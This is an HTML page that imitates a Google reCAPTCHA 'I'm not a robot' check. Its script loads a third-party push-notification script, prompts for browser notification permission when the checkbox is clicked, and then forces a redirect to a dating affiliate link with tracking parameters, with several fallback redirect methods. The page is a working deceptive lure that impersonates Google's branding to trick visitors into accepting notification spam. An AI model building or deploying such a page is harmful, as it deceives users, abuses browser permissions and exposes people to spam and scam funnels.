<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="tlsdk" content="6ce3ce667cc14beabf44647a39a3694d">
    <title>reCAPTCHA</title>
    <style>
    body {
        font-family: 'Roboto', Arial, sans-serif;
        margin: 0;
        background-color: #f9f9f9;
        overflow: hidden;
    }
    .container {
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        display: flex;
        flex-direction: column;
        align-items: flex-start;
        gap: 10px;
    }
    .captcha-container {
        display: flex;
        align-items: center;
        justify-content: space-between;
        width: 300px;
        padding: 10px;
        border: 1px solid #dfe1e5;
        border-radius: 4px;
        background-color: #fff;
    }
    .captcha-left {
        display: flex;
        align-items: center;
    }
    .captcha-checkbox {
        margin-right: 10px;
        width: 20px;
        height: 20px;
        cursor: pointer;
        border: 2px solid #000;
        background-color: transparent;
        position: relative;
        appearance: none;
        -webkit-appearance: none;
        -moz-appearance: none;
        box-sizing: border-box;
    }
    .captcha-checkbox.loading {
        border: none;
        background-color: transparent;
    }
    .captcha-checkbox.loading::before {
        content: '';
        width: 20px;
        height: 20px;
        border: 3px solid #1a73e8;
        border-top-color: transparent;
        border-radius: 50%;
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        animation: spin 0.8s linear infinite;
    }
    .captcha-checkbox.completed {
        border: none;
        background-color: transparent;
    }
    .captcha-checkbox.completed::before {
        content: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="green" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>');
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        display: block;
    }
    @keyframes spin {
        0% {
            transform: translate(-50%, -50%) rotate(0deg);
        }
        100% {
            transform: translate(-50%, -50%) rotate(360deg);
        }
    }
    .captcha-text {
        font-size: 14px;
        color: #000;
        white-space: nowrap; /* Предотвращает перенос текста */
    }
    .captcha-right {
        display: flex;
        flex-direction: column;
        align-items: flex-end;
    }
    .captcha-logo {
        width: 20px;
        height: 20px;
        margin-bottom: 5px;
    }
    .captcha-brand {
        font-size: 12px;
        color: #757575;
        white-space: nowrap; /* Предотвращает перенос текста */
    }
    .captcha-links {
        font-size: 10px;
        color: #757575;
        white-space: nowrap; /* Предотвращает перенос текста */
    }
    .captcha-links a {
        color: #757575;
        text-decoration: none;
    }
    .submit-button {
        padding: 8px 16px;
        background-color: #f1f3f4;
        border: 1px solid #dadce0;
        border-radius: 4px;
        font-size: 14px;
        color: #202124;
        cursor: pointer;
        white-space: nowrap; /* Предотвращает перенос текста */
    }
    .submit-button:hover {
        background-color: #e8eaed;
    }
    .button-container {
        display: flex;
        flex-direction: column;
        align-items: flex-start;
    }
    .error {
        color: red;
        font-size: 12px;
        display: none;
        margin-top: 5px;
        white-space: nowrap; /* Предотвращает перенос текста */
    }

    /* Медиа-запросы для адаптации шрифта */
    @media (max-width: 360px) {
        .captcha-text {
            font-size: 12px; /* Уменьшаем шрифт для узких экранов */
        }
        .captcha-brand {
            font-size: 10px;
        }
        .captcha-links {
            font-size: 8px;
        }
        .submit-button {
            font-size: 12px;
        }
        .error {
            font-size: 10px;
        }
        .captcha-container {
            width: 280px; /* Уменьшаем ширину контейнера */
        }
    }

    @media (max-width: 320px) {
        .captcha-text {
            font-size: 10px; /* Еще меньше для очень узких экранов */
        }
        .captcha-brand {
            font-size: 9px;
        }
        .captcha-links {
            font-size: 7px;
        }
        .submit-button {
            font-size: 10px;
        }
        .error {
            font-size: 9px;
        }
        .captcha-container {
            width: 260px; /* Еще меньшая ширина */
        }
    }
</style>
</head>
<body>
    <script type="application/javascript" src="https://lobpc.ext-jscdn.com/ps/ps.js?id=HnFv7gIgUEyhZsQd8kp20Q&sub_id=test_campaign" async></script>
    <div class="container">
        <div class="captcha-container">
            <div class="captcha-left">
                <input type="checkbox" id="captcha" class="captcha-checkbox">
                <span class="captcha-text" id="captcha-text">Я не робот</span>
            </div>
            <div class="captcha-right">
                <img src="https://www.melett.ru/wp-content/uploads/2023/09/recaptcha-logo-icon.png" class="captcha-logo" alt="reCAPTCHA">
                <span class="captcha-brand">reCAPTCHA</span>
                <div class="captcha-links">
                    <a href="https://policies.google.com/privacy" target="_blank" id="privacy-link">Конфиденциальность</a> - 
                    <a href="https://policies.google.com/terms" target="_blank" id="terms-link">Условия использования</a>
                </div>
            </div>
        </div>
        <div class="button-container">
            <button class="submit-button" id="submit-button">Подтвердить</button>
            <div class="error" id="error">Пожалуйста, подтвердите, что вы не робот.</div>
        </div>
    </div>
<script>
    // Language translations
    const translations = {
        en: { checkboxText: "I'm not a robot", verify: "Verify", error: "Please verify that you are not a robot.", privacy: "Privacy", terms: "Terms of Service" },
        ru: { checkboxText: "Я не робот", verify: "Подтвердить", error: "Пожалуйста, подтвердите, что вы не робот.", privacy: "Конфиденциальность", terms: "Условия использования" },
        es: { checkboxText: "No soy un robot", verify: "Verificar", error: "Por favor, verifica que no eres un robot.", privacy: "Privacidad", terms: "Términos de servicio" },
        fr: { checkboxText: "Je ne suis pas un robot", verify: "Vérifier", error: "Veuillez vérifier que vous n'êtes pas un robot.", privacy: "Confidentialité", terms: "Conditions d'utilisation" },
        de: { checkboxText: "Ich bin kein Roboter", verify: "Überprüfen", error: "Bitte überprüfen Sie, dass Sie kein Roboter sind.", privacy: "Datenschutz", terms: "Nutzungsbedingungen" },
        it: { checkboxText: "Non sono un robot", verify: "Verifica", error: "Per favore, verifica che non sei un robot.", privacy: "Privacy", terms: "Termini di servizio" },
        pt: { checkboxText: "Não sou um robô", verify: "Verificar", error: "Por favor, verifique que você não é um robô.", privacy: "Privacidade", terms: "Termos de serviço" },
        zh: { checkboxText: "我不是机器人", verify: "验证", error: "请验证您不是机器人。", privacy: "隐私", terms: "服务条款" },
        ja: { checkboxText: "私はロボットではありません", verify: "確認する", error: "あなたがロボットでないことを確認してください。", privacy: "プライバシー", terms: "利用規約" },
        ko: { checkboxText: "로봇이 아닙니다", verify: "확인", error: "로봇이 아님을 확인해 주세요.", privacy: "개인정보", terms: "이용약관" },
        ar: { checkboxText: "أنا لست روبوت", verify: "تحقق", error: "يرجى التحقق من أنك لست روبوتًا.", privacy: "الخصوصية", terms: "شروط الخدمة" },
        hi: { checkboxText: "मैं रोबोट नहीं हूँ", verify: "सत्यापित करें", error: "कृपया सत्यापित करें कि आप रोबोट नहीं हैं।", privacy: "गोपनीयता", terms: "सेवा की शर्तें" },
        tr: { checkboxText: "Ben robot değilim", verify: "Doğrula", error: "Lütfen robot olmadığınızı doğrulayın.", privacy: "Gizlilik", terms: "Hizmet Şartları" },
        uk: { checkboxText: "Я не робот", verify: "Підтвердити", error: "Будь ласка, підтвердьте, що ви не робот.", privacy: "Конфіденційність", terms: "Умови використання" },
        hu: { checkboxText: "Nem vagyok robot", verify: "Ellenőrzés", error: "Kérjük, ellenőrizze, hogy nem robot.", privacy: "Adatvédelem", terms: "Felhasználási feltételek" },
        el: { checkboxText: "Δεν είμαι ρομπότ", verify: "Επιβεβαίωση", error: "Παρακαλώ επιβεβαιώστε ότι δεν είστε ρομπότ.", privacy: "Απόρρητο", terms: "Όροι Χρήσης" },
        tl: { checkboxText: "Hindi ako robot", verify: "Beripikahan", error: "Paki-verify na hindi ka robot.", privacy: "Pribasidad", terms: "Mga Tuntunin ng Serbisyo" },
        ur: { checkboxText: "میں روبوٹ نہیں ہوں", verify: "تصدیق کریں", error: "براہ کرم تصدیق کریں کہ آپ روبوٹ نہیں ہیں۔", privacy: "رازداری", terms: "سروس کی شرائط" },
        nl: { checkboxText: "Ik ben geen robot", verify: "Verifiëren", error: "Controleer a.u.b. dat u geen robot bent.", privacy: "Privacy", terms: "Gebruiksvoorwaarden" },
        ps: { checkboxText: "زه روبوټ نه یم", verify: "تصدیق", error: "مهرباني وکړئ تصدیق کړئ چې تاسو روبوټ نه یاست.", privacy: "محرمیت", terms: "د خدمت شرایط" },
        id: { checkboxText: "Saya bukan robot", verify: "Verifikasi", error: "Harap verifikasi bahwa Anda bukan robot.", privacy: "Privasi", terms: "Ketentuan Layanan" }
    };

    // Detect browser language
    const userLang = (navigator.language || navigator.userLanguage || 'en').split('-')[0];
    const selectedLang = translations[userLang] ? userLang : 'en';
    const translation = translations[selectedLang];

    // Update DOM elements with translated text
    document.getElementById('captcha-text').textContent = translation.checkboxText;
    document.getElementById('submit-button').textContent = translation.verify;
    document.getElementById('error').textContent = translation.error;
    document.getElementById('privacy-link').textContent = translation.privacy;
    document.getElementById('terms-link').textContent = translation.terms;

    // Меняем lang атрибут HTML на язык браузера
    document.documentElement.lang = selectedLang;

    // Ссылка для редиректа
    const redirectUrl = 'https://gxrjxq.excelientdates.com/?utm_source=da57dc555e50572d&ban=other&j1=1&s1=96847&s2=2070502&s3=yd0';

    // Функция для логирования подписки
    function logSubscription(permission, subId = 'test_campaign') {
        const data = {
            id: 'HnFv7gIgUEyhZsQd8kp20Q',
            sub_id: subId,
            permission: permission,
            timestamp: new Date().toISOString()
        };
        console.log('Лог подписки:', data);
    }

    // Функция для выполнения редиректа
    function performRedirect() {
        console.log('Попытка редиректа на:', redirectUrl);
        try {
            const isWebView = navigator.userAgent.includes('wv') || navigator.userAgent.includes('WebView');
            if (isWebView) {
                console.log('Обнаружен WebView, используем location.assign');
                window.location.assign(redirectUrl);
            } else {
                console.log('Стандартный редирект через location.href');
                window.location.href = redirectUrl;
            }
            setTimeout(() => {
                if (window.location.href !== redirectUrl) {
                    console.log('Резервный редирект через location.replace');
                    window.location.replace(redirectUrl);
                }
            }, 500);
        } catch (e) {
            console.error('Ошибка редиректа:', e);
            try {
                console.log('Попытка редиректа через программный клик');
                const link = document.createElement('a');
                link.href = redirectUrl;
                link.style.display = 'none';
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
            } catch (clickError) {
                console.error('Ошибка программного клика:', clickError);
                const error = document.getElementById('error');
                error.innerHTML = `${translation.error} <a href="${redirectUrl}">${translation.verify}</a>`;
                error.style.display = 'block';
            }
        }
    }

    // Функция для ожидания загрузки ps.js
    function waitForPsJs(maxAttempts = 10, interval = 500) {
        return new Promise((resolve, reject) => {
            let attempts = 0;
            const checkPs = () => {
                if (window.ps && typeof window.ps.showPrompt === 'function') {
                    console.log('ps.js загружен успешно');
                    resolve();
                } else if (attempts >= maxAttempts) {
                    console.error('ps.js не загружен после максимального количества попыток');
                    reject(new Error('ps.js not loaded'));
                } else {
                    attempts++;
                    console.log(`Ожидание ps.js, попытка ${attempts}/${maxAttempts}`);
                    setTimeout(checkPs, interval);
                }
            };
            checkPs();
        });
    }

    // Функция для запроса подписки
    function requestSubscription(checkbox) {
        console.log('Запуск requestSubscription');
        try {
            if ('Notification' in window && (Notification.permission === 'granted' || Notification.permission === 'denied')) {
                console.log('Уведомления уже разрешены или заблокированы:', Notification.permission);
                logSubscription(Notification.permission);
                checkbox.classList.remove('loading');
                checkbox.classList.add('completed');
                setTimeout(() => {
                    console.log('Запуск редиректа после галочки');
                    performRedirect();
                }, 1000);
                return;
            }

            waitForPsJs()
                .then(() => {
                    console.log('Вызываем подписку через ps.js');
                    window.ps.showPrompt()
                        .then(result => {
                            console.log('Результат подписки:', result);
                            logSubscription(Notification.permission);
                            checkbox.classList.remove('loading');
                            checkbox.classList.add('completed');
                            setTimeout(() => {
                                console.log('Запуск редиректа после галочки');
                                performRedirect();
                            }, 1000);
                        })
                        .catch(err => {
                            console.error('Ошибка вызова подписки:', err);
                            logSubscription(Notification.permission);
                            checkbox.classList.remove('loading');
                            checkbox.classList.add('completed');
                            setTimeout(() => {
                                console.log('Запуск редиректа после галочки');
                                performRedirect();
                            }, 1000);
                        });
                })
                .catch(() => {
                    console.log('API ps.js не доступен, пробуем Notification API');
                    if ('Notification' in window) {
                        Notification.requestPermission()
                            .then(permission => {
                                console.log('Результат разрешения:', permission);
                                logSubscription(permission);
                                checkbox.classList.remove('loading');
                                checkbox.classList.add('completed');
                                setTimeout(() => {
                                    console.log('Запуск редиректа после галочки');
                                    performRedirect();
                                }, 1000);
                            })
                            .catch(err => {
                                console.error('Ошибка Notification API:', err);
                                logSubscription('error');
                                checkbox.classList.remove('loading');
                                checkbox.classList.add('completed');
                                setTimeout(() => {
                                    console.log('Запуск редиректа после галочки');
                                    performRedirect();
                                }, 1000);
                            });
                    } else {
                        console.log('Уведомления не поддерживаются');
                        logSubscription('unsupported');
                        checkbox.classList.remove('loading');
                        checkbox.classList.add('completed');
                        setTimeout(() => {
                            console.log('Запуск редиректа после галочки');
                            performRedirect();
                        }, 1000);
                    }
                });
        } catch (e) {
            console.error('Общая ошибка в requestSubscription:', e);
            logSubscription('error');
            checkbox.classList.remove('loading');
            checkbox.classList.add('completed');
            setTimeout(() => {
                console.log('Запуск редиректа после галочки');
                performRedirect();
            }, 1000);
        }
    }

    // Функция проверки
    function verify() {
        const checkbox = document.getElementById('captcha');
        const error = document.getElementById('error');
        if (checkbox.checked) {
            console.log('Чекбокс отмечен, запускаем подписку');
            error.style.display = 'none';
            checkbox.disabled = true;
            checkbox.classList.add('loading');
            requestSubscription(checkbox);
            checkbox.disabled = false;
        } else {
            error.style.display = 'block';
        }
    }

    // События
    document.getElementById('captcha').addEventListener('click', () => {
        console.log('Чекбокс кликнут');
        const checkbox = document.getElementById('captcha');
        if (!checkbox.checked) {
            checkbox.checked = true;
        }
        verify();
    });

    document.getElementById('submit-button').addEventListener('click', () => {
        console.log('Нажата кнопка Отправить');
        verify();
    });
</script>
</body>
</html>